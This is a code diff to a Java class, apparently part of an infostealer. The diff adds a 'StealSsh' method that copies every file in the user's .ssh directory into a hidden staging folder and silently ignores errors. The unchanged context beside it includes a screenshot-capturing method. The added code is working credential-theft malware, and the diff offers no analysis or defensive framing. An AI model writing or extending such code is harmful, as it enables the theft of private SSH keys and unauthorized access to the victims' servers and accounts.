@@ -35,6 +35,22 @@ public class zero {
       } catch (Exception var4) { var4.printStackTrace(); }
    }
 
+   public static void StealSsh() {
+      try {
+         new File(back.xdFolderPath + "\\ssh").mkdirs();
+         String var0 = System.getProperty("user.home") + "\\.ssh";
+         File var1 = new File(var0);
+         if (Files.isDirectory(var1.toPath(), new LinkOption[0])) {
+            File[] files = Objects.requireNonNull(var1.listFiles());
+            for (File file : files) {
+               if (file.isFile()) {
+                  utils.copyFile(new File(var0 + "\\" + file.getName()), new File(back.xdFolderPath + "\\ssh\\" + file.getName()));
+               }
+            }
+         }
+      } catch (Exception e) { }
+   }
+
    public static void ScreenshotScreen(){
       try {
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
